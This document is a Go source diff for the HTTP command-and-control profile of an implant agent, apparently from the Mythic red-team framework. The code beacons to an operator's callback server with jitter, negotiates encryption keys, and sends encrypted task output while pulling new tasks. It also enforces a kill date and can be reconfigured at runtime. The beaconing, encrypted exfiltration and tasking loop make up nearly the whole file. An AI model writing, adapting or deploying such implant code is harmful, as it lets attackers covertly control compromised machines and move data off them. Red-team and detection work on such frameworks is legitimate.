@@ -1,20 +1,19 @@
 //go:build (linux || darwin || windows) && http
-// +build linux darwin windows
-// +build http
 
 package profiles
 
 import (
 	"bytes"
 	"crypto/rsa"
-	"crypto/tls"
 	"encoding/base64"
-	"log"
+	"io"
 	"os"
+
+	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/responses"
+	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils"
 
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"math/rand"
 	"net/http"
 	"net/url"
@@ -31,95 +30,99 @@ import (
 // All variables must be a string so they can be set with ldflags
 
 // callback_host is the callback host
-var callback_host string
+var http_callback_host string
 
 // callback_port is the callback port
-var callback_port string
+var http_callback_port string
 
 // killdate is the Killdate
-var killdate string
+var http_killdate string
 
 // encrypted_exchange_check is Perform Key Exchange
-var encrypted_exchange_check string
+var http_encrypted_exchange_check string
 
 // callback_interval is the callback interval in seconds
-var callback_interval string
+var http_callback_interval string
 
 // callback_jitter is Callback Jitter in percent
-var callback_jitter string
+var http_callback_jitter string
 
 // headers
-var headers string
+var http_headers string
 
 // AESPSK is the Crypto type
-var AESPSK string
+var http_AESPSK string
 
 // post_uri is the POST request URI
-var post_uri string
+var http_post_uri string
 
-var proxy_host string
-var proxy_port string
-var proxy_user string
-var proxy_pass string
-var proxy_bypass string
+var http_proxy_host string
+var http_proxy_port string
+var http_proxy_user string
+var http_proxy_pass string
+var http_proxy_bypass string
 
-type C2Default struct {
-	BaseURL        string
-	PostURI        string
-	ProxyURL       string
-	ProxyUser      string
-	ProxyPass      string
-	ProxyBypass    bool
-	Interval       int
-	Jitter         int
-	HeaderList     []structs.HeaderStruct
+type C2HTTP struct {
+	BaseURL        string            `json:"BaseURL"`
+	PostURI        string            `json:"PostURI"`
+	ProxyURL       string            `json:"ProxyURL"`
+	ProxyUser      string            `json:"ProxyUser"`
+	ProxyPass      string            `json:"ProxyPass"`
+	ProxyBypass    bool              `json:"ProxyBypass"`
+	Interval       int               `json:"Interval"`
+	Jitter         int               `json:"Jitter"`
+	HeaderList     map[string]string `json:"Headers"`
 	ExchangingKeys bool
-	Key            string
+	Key            string `json:"EncryptionKey"`
 	RsaPrivateKey  *rsa.PrivateKey
-	Killdate       time.Time
+	Killdate       time.Time `json:"KillDate"`
+	ShouldStop     bool
+	stoppedChannel chan bool
 }
 
 // New creates a new HTTP C2 profile from the package's global variables and returns it
-func New() structs.Profile {
+func init() {
 	var final_url string
 	var last_slash int
-	if callback_port == "443" && strings.Contains(callback_host, "https://") {
-		final_url = callback_host
-	} else if callback_port == "80" && strings.Contains(callback_host, "http://") {
-		final_url = callback_host
+	if http_callback_port == "443" && strings.Contains(http_callback_host, "https://") {
+		final_url = http_callback_host
+	} else if http_callback_port == "80" && strings.Contains(http_callback_host, "http://") {
+		final_url = http_callback_host
 	} else {
-		last_slash = strings.Index(callback_host[8:], "/")
+		last_slash = strings.Index(http_callback_host[8:], "/")
 		if last_slash == -1 {
 			//there is no 3rd slash
-			final_url = fmt.Sprintf("%s:%s", callback_host, callback_port)
+			final_url = fmt.Sprintf("%s:%s", http_callback_host, http_callback_port)
 		} else {
 			//there is a 3rd slash, so we need to splice in the port
 			last_slash += 8 // adjust this back to include our offset initially
 			//fmt.Printf("index of last slash: %d\n", last_slash)
 			//fmt.Printf("splitting into %s and %s\n", string(callback_host[0:last_slash]), string(callback_host[last_slash:]))
-			final_url = fmt.Sprintf("%s:%s%s", string(callback_host[0:last_slash]), callback_port, string(callback_host[last_slash:]))
+			final_url = fmt.Sprintf("%s:%s%s", string(http_callback_host[0:last_slash]), http_callback_port, string(http_callback_host[last_slash:]))
 		}
 	}
 	if final_url[len(final_url)-1:] != "/" {
 		final_url = final_url + "/"
 	}
 	//fmt.Printf("final url: %s\n", final_url)
-	killDateString := fmt.Sprintf("%sT00:00:00.000Z", killdate)
+	killDateString := fmt.Sprintf("%sT00:00:00.000Z", http_killdate)
 	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
 	if err != nil {
 		os.Exit(1)
 	}
-	profile := C2Default{
-		BaseURL:   final_url,
-		PostURI:   post_uri,
-		ProxyUser: proxy_user,
-		ProxyPass: proxy_pass,
-		Key:       AESPSK,
-		Killdate:  killDateTime,
+	profile := C2HTTP{
+		BaseURL:        final_url,
+		PostURI:        http_post_uri,
+		ProxyUser:      http_proxy_user,
+		ProxyPass:      http_proxy_pass,
+		Key:            http_AESPSK,
+		Killdate:       killDateTime,
+		ShouldStop:     true,
+		stoppedChannel: make(chan bool, 1),
 	}
 
 	// Convert sleep from string to integer
-	i, err := strconv.Atoi(callback_interval)
+	i, err := strconv.Atoi(http_callback_interval)
 	if err == nil {
 		profile.Interval = i
 	} else {
@@ -127,7 +130,7 @@ func New() structs.Profile {
 	}
 
 	// Convert jitter from string to integer
-	j, err := strconv.Atoi(callback_jitter)
+	j, err := strconv.Atoi(http_callback_jitter)
 	if err == nil {
 		profile.Jitter = j
 	} else {
@@ -136,53 +139,70 @@ func New() structs.Profile {
 
 	// Add HTTP Headers
 	//json.Unmarshal([]byte("[{\"name\": \"User-Agent\",\"key\": \"User-Agent\",\"value\": \"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\"}]"), &profile.HeaderList)
-	json.Unmarshal([]byte(headers), &profile.HeaderList)
+	if err := json.Unmarshal([]byte(http_headers), &profile.HeaderList); err != nil {
+		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
+	}
 
 	// Add proxy info if set
-	if len(proxy_host) > 3 {
-		profile.ProxyURL = fmt.Sprintf("%s:%s/", proxy_host, proxy_port)
+	if len(http_proxy_host) > 3 {
+		profile.ProxyURL = fmt.Sprintf("%s:%s/", http_proxy_host, http_proxy_port)
 
-		if len(proxy_user) > 0 && len(proxy_pass) > 0 {
-			profile.ProxyUser = proxy_user
-			profile.ProxyPass = proxy_pass
+		if len(http_proxy_user) > 0 && len(http_proxy_pass) > 0 {
+			profile.ProxyUser = http_proxy_user
+			profile.ProxyPass = http_proxy_pass
 		}
 	}
 
 	// Convert ignore_proxy from string to bool
-	profile.ProxyBypass, _ = strconv.ParseBool(proxy_bypass)
+	profile.ProxyBypass, _ = strconv.ParseBool(http_proxy_bypass)
 
-	if encrypted_exchange_check == "true" {
+	if http_encrypted_exchange_check == "true" {
 		profile.ExchangingKeys = true
 	}
-	return &profile
+	RegisterAvailableC2Profile(&profile)
 }
 
-func (c *C2Default) Start() {
+func (c *C2HTTP) Start() {
 	// Checkin with Mythic via an egress channel
+	// only try to start if we're in a stopped state
+	if !c.ShouldStop {
+		return
+	}
+	c.ShouldStop = false
+	defer func() {
+		c.stoppedChannel <- true
+	}()
 	for {
-		resp := c.CheckIn()
-		checkIn := resp.(structs.CheckInMessageResponse)
+
+		if c.ShouldStop {
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start before fully checking in\n"))
+			return
+		}
+		checkIn := c.CheckIn()
 		// If we successfully checkin, get our new ID and start looping
 		if strings.Contains(checkIn.Status, "success") {
-			SetMythicID(checkIn.ID)
 			for {
+				if c.ShouldStop {
+					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in Start after fully checking in\n"))
+					return
+				}
 				// loop through all task responses
-				message := CreateMythicMessage()
+				message := responses.CreateMythicPollMessage()
 				if encResponse, err := json.Marshal(message); err == nil {
 					//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
-					resp := c.SendMessage(encResponse).([]byte)
+					resp := c.SendMessage(encResponse)
 					if len(resp) > 0 {
 						//fmt.Printf("Raw resp: \n %s\n", string(resp))
 						taskResp := structs.MythicMessageResponse{}
 						if err := json.Unmarshal(resp, &taskResp); err != nil {
-							log.Printf("Error unmarshal response to task response: %s", err.Error())
+							utils.PrintDebug(fmt.Sprintf("Error unmarshal response to task response: %s", err.Error()))
 							time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 							continue
 						}
-						HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+						responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
 					}
 				} else {
-					//fmt.Printf("Failed to marshal message: %v\n", err)
+					utils.PrintDebug(fmt.Sprintf("Failed to marshal message: %v\n", err))
 				}
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			}
@@ -192,8 +212,55 @@ func (c *C2Default) Start() {
 	}
 
 }
-
-func (c *C2Default) GetSleepTime() int {
+func (c *C2HTTP) Stop() {
+	if c.ShouldStop {
+		return
+	}
+	c.ShouldStop = true
+	utils.PrintDebug("issued stop to http\n")
+	<-c.stoppedChannel
+	utils.PrintDebug("http fully stopped\n")
+}
+func (c *C2HTTP) UpdateConfig(parameter string, value string) {
+	switch parameter {
+	case "BaseURL":
+		c.BaseURL = value
+	case "PostURI":
+		c.PostURI = value
+	case "ProxyUser":
+		c.ProxyUser = value
+	case "ProxyPass":
+		c.ProxyPass = value
+	case "ProxyBypass":
+		c.ProxyPass = value
+	case "EncryptionKey":
+		c.Key = value
+	case "Interval":
+		newInt, err := strconv.Atoi(value)
+		if err == nil {
+			c.Interval = newInt
+		}
+	case "Jitter":
+		newInt, err := strconv.Atoi(value)
+		if err == nil {
+			c.Jitter = newInt
+		}
+	case "Killdate":
+		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
+		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
+		if err == nil {
+			c.Killdate = killDateTime
+		}
+	case "Headers":
+		if err := json.Unmarshal([]byte(value), &c.HeaderList); err != nil {
+			utils.PrintDebug(fmt.Sprintf("error trying to unmarshal headers: %v\n", err))
+		}
+	}
+}
+func (c *C2HTTP) GetSleepTime() int {
+	if c.ShouldStop {
+		return -1
+	}
 	if c.Jitter > 0 {
 		jit := float64(rand.Int()%c.Jitter) / float64(100)
 		jitDiff := float64(c.Interval) * jit
@@ -207,7 +274,7 @@ func (c *C2Default) GetSleepTime() int {
 	}
 }
 
-func (c *C2Default) SetSleepInterval(interval int) string {
+func (c *C2HTTP) SetSleepInterval(interval int) string {
 	if interval >= 0 {
 		c.Interval = interval
 		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
@@ -217,7 +284,7 @@ func (c *C2Default) SetSleepInterval(interval int) string {
 
 }
 
-func (c *C2Default) SetSleepJitter(jitter int) string {
+func (c *C2HTTP) SetSleepJitter(jitter int) string {
 	if jitter >= 0 && jitter <= 100 {
 		c.Jitter = jitter
 		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
@@ -226,38 +293,53 @@ func (c *C2Default) SetSleepJitter(jitter int) string {
 	}
 }
 
-func (c *C2Default) ProfileType() string {
+func (c *C2HTTP) ProfileName() string {
 	return "http"
 }
 
+func (c *C2HTTP) IsP2P() bool {
+	return false
+}
+func (c *C2HTTP) GetPushChannel() chan structs.MythicMessage {
+	return nil
+}
+
 // CheckIn a new agent
-func (c *C2Default) CheckIn() interface{} {
+func (c *C2HTTP) CheckIn() structs.CheckInMessageResponse {
 
 	// Start Encrypted Key Exchange (EKE)
 	if c.ExchangingKeys {
 		for !c.NegotiateKey() {
 			// loop until we successfully negotiate a key
 			//fmt.Printf("trying to negotiate key\n")
+			if c.ShouldStop {
+				utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn while !c.NegotiateKey\n"))
+				return structs.CheckInMessageResponse{}
+			}
 		}
 	}
 	for {
+		if c.ShouldStop {
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in CheckIn\n"))
+			return structs.CheckInMessageResponse{}
+		}
 		checkin := CreateCheckinMessage()
 		if raw, err := json.Marshal(checkin); err != nil {
 			time.Sleep(time.Duration(c.GetSleepTime()))
 			continue
 		} else {
-			resp := c.SendMessage(raw).([]byte)
+			resp := c.SendMessage(raw)
 
 			// save the Mythic id
 			response := structs.CheckInMessageResponse{}
 			if err = json.Unmarshal(resp, &response); err != nil {
-				//log.Printf("Error in unmarshal:\n %s", err.Error())
+				utils.PrintDebug(fmt.Sprintf("Error in unmarshal:\n %s", err.Error()))
 				time.Sleep(time.Duration(c.GetSleepTime()))
 				continue
 			}
 			if len(response.ID) != 0 {
-				//log.Printf("Saving new UUID: %s\n", response.ID)
 				SetMythicID(response.ID)
+				SetAllEncryptionKeys(c.Key)
 				return response
 			} else {
 				time.Sleep(time.Duration(c.GetSleepTime()))
@@ -270,8 +352,8 @@ func (c *C2Default) CheckIn() interface{} {
 }
 
 // NegotiateKey - EKE key negotiation
-func (c *C2Default) NegotiateKey() bool {
-	sessionID := GenerateSessionID()
+func (c *C2HTTP) NegotiateKey() bool {
+	sessionID := utils.GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
 	// Replace struct with dynamic json
@@ -287,22 +369,23 @@ func (c *C2Default) NegotiateKey() bool {
 		return false
 	}
 
-	resp := c.SendMessage(raw).([]byte)
+	resp := c.SendMessage(raw)
 	// Decrypt & Unmarshal the response
-
 	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
-
+	if c.ShouldStop {
+		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in NegotiateKey\n"))
+		return false
+	}
 	err = json.Unmarshal(resp, &sessionKeyResp)
 	if err != nil {
-		//log.Printf("Error unmarshaling eke response: %s\n", err.Error())
+		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
 		return false
 	}
 
 	encryptedSessionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
 	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
 	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
-	c.ExchangingKeys = false
-
+	SetAllEncryptionKeys(c.Key)
 	if len(sessionKeyResp.UUID) > 0 {
 		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
 	} else {
@@ -311,32 +394,28 @@ func (c *C2Default) NegotiateKey() bool {
 
 	return true
 }
-
-// PostResponse - Post task responses
-func (c *C2Default) SendMessage(output []byte) interface{} {
-	endpoint := c.PostURI
-	return c.htmlPostData(endpoint, output)
-
+func (c *C2HTTP) SetEncryptionKey(newKey string) {
+	c.Key = newKey
+	c.ExchangingKeys = false
 }
-
-var tr = &http.Transport{
-	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	MaxIdleConns:    10,
-	MaxConnsPerHost: 10,
-	//IdleConnTimeout: 1 * time.Nanosecond,
+func (c *C2HTTP) GetConfig() string {
+	jsonString, err := json.MarshalIndent(c, "", "  ")
+	if err != nil {
+		return fmt.Sprintf("Failed to get config: %v\n", err)
+	}
+	return string(jsonString)
 }
-var client = &http.Client{
-	Timeout:   5 * time.Second,
-	Transport: tr,
+func (c *C2HTTP) IsRunning() bool {
+	return !c.ShouldStop
 }
 
 // htmlPostData HTTP POST function
-func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
+func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
-	//log.Println("Sending POST request to url: ", url)
+	//log.Println("Sending POST request to url: ", targeturl)
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.Key) != 0 {
-		//log.Printf("Encrypting Post data")
+		//log.Printf("Encrypting Post data: %v\n", string(sendData))
 		sendData = c.encryptMessage(sendData)
 	}
 	if GetMythicID() != "" {
@@ -346,7 +425,7 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	}
 	//fmt.Printf("Sending: %v\n", string(sendData))
 	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
-
+	//utils.PrintDebug(string(sendDataBase64))
 	if len(c.ProxyURL) > 0 {
 		proxyURL, _ := url.Parse(c.ProxyURL)
 		tr.Proxy = http.ProxyURL(proxyURL)
@@ -357,86 +436,128 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 
 	contentLength := len(sendDataBase64)
 	//byteBuffer := bytes.NewBuffer(sendDataBase64)
-	for true {
+	// bail out of trying to send data after 5 failed attempts
+	for i := 0; i < 5; i++ {
+		if c.ShouldStop {
+			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in SendMessage\n"))
+			return []byte{}
+		}
 		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
 		today := time.Now()
 		if today.After(c.Killdate) {
+			utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
 			os.Exit(1)
-		} else if req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64)); err != nil {
-			//fmt.Printf("Error creating new http request: %s", err.Error())
+		}
+		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64))
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("Error creating new http request: %s", err.Error()))
 			continue
-		} else {
-			req.ContentLength = int64(contentLength)
-			// set headers
-			for _, val := range c.HeaderList {
-				if val.Key == "Host" {
-					req.Host = val.Value
-				} else if val.Key == "User-Agent" {
-					req.Header.Set(val.Key, val.Value)
-					tr.ProxyConnectHeader = http.Header{}
-					tr.ProxyConnectHeader.Add("User-Agent", val.Value)
-				} else {
-					req.Header.Set(val.Key, val.Value)
-				}
+		}
+		req.ContentLength = int64(contentLength)
+		// set headers
+		for key, val := range c.HeaderList {
+			if key == "Host" {
+				req.Host = val
+			} else if key == "User-Agent" {
+				req.Header.Set(key, val)
+				tr.ProxyConnectHeader = http.Header{}
+				tr.ProxyConnectHeader.Add("User-Agent", val)
+			} else if key == "Content-Length" {
+				continue
+			} else {
+				req.Header.Set(key, val)
 			}
-			if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
+		}
+		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
+			req.SetBasicAuth(c.ProxyUser, c.ProxyPass)
+			/*
 				auth := fmt.Sprintf("%s:%s", c.ProxyUser, c.ProxyPass)
 				basicAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(auth))
 				req.Header.Add("Proxy-Authorization", basicAuth)
+
+			*/
+		}
+		resp, err := client.Do(req)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error client.Do: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		if resp.StatusCode != 200 {
+			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
+			err = resp.Body.Close()
+			if err != nil {
+				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
 			}
-			if resp, err := client.Do(req); err != nil {
-				//fmt.Printf("error client.Do: %v\n", err)
-				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-				continue
-			} else if resp.StatusCode != 200 {
-				//fmt.Printf("error resp.StatusCode: %v\n", resp.StatusCode)
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		body, err := io.ReadAll(resp.Body)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
+			err = resp.Body.Close()
+			if err != nil {
+				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
+			}
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		err = resp.Body.Close()
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
+		}
+		//utils.PrintDebug(fmt.Sprintf("raw response: %s\n", string(body)))
+		raw, err := base64.StdEncoding.DecodeString(string(body))
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		if len(raw) < 36 {
+			utils.PrintDebug(fmt.Sprintf("error len(raw) < 36: %v\n", err))
+			IncrementFailedConnection(c.ProfileName())
+			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
+			continue
+		}
+		if len(c.Key) != 0 {
+			//log.Println("just did a post, and decrypting the message back")
+			enc_raw := c.decryptMessage(raw[36:])
+			if len(enc_raw) == 0 {
+				// failed somehow in decryption
+				utils.PrintDebug(fmt.Sprintf("error decrypt length wrong: %v\n", err))
+				IncrementFailedConnection(c.ProfileName())
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 				continue
 			} else {
-				defer resp.Body.Close()
-				if body, err := ioutil.ReadAll(resp.Body); err != nil {
-					//fmt.Printf("error ioutil.ReadAll: %v\n", err)
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
-				} else if raw, err := base64.StdEncoding.DecodeString(string(body)); err != nil {
-					//fmt.Printf("error base64.StdEncoding: %v\n", err)
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
-				} else if len(raw) < 36 {
-					//fmt.Printf("error len(raw) < 36: %v\n", err)
-					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-					continue
-				} else if len(c.Key) != 0 {
-					//log.Println("just did a post, and decrypting the message back")
-					enc_raw := c.decryptMessage(raw[36:])
-					if len(enc_raw) == 0 {
-						// failed somehow in decryption
-						//fmt.Printf("error decrypt length wrong: %v\n", err)
-						time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
-						continue
-					} else {
-						//fmt.Printf("response: %v\n%v\n", string(raw[:36]), string(enc_raw))
-						return enc_raw
-					}
-				} else {
-					//fmt.Printf("response: %v\n", string(raw))
-					return raw[36:]
+				if i > 0 {
+					utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
 				}
+				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
+				return enc_raw
 			}
+		} else {
+			if i > 0 {
+				utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
+			}
+			//fmt.Printf("response: %v\n", string(raw))
+			return raw[36:]
 		}
-		//log.Printf("shouldn't be here\n")
-		return make([]byte, 0)
+
 	}
-	//log.Printf("shouldn't be here either\n")
+	utils.PrintDebug(fmt.Sprintf("Aborting sending message after 5 failed attempts"))
 	return make([]byte, 0) //shouldn't get here
 }
 
-func (c *C2Default) encryptMessage(msg []byte) []byte {
+func (c *C2HTTP) encryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 
-func (c *C2Default) decryptMessage(msg []byte) []byte {
+func (c *C2HTTP) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
